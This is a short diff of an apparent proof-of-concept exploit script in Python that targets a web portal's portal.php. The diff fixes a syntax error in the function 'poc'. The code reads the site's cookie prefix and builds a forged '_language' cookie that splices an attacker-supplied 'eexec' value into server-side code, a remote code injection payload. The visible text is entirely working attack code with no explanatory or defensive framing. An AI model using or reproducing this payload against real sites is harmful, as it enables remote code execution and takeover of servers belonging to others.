@@ -12,7 +12,7 @@ headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5
 def poc(url,eexec):
 	if "http://" in url or "https://" in url:
 		url = url+'/portal.php'
-	else
+	else:
 		url = 'http://'+url+'/portal.php'
 	sign = requests.get(url).headers['Set-cookie'][:9]
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
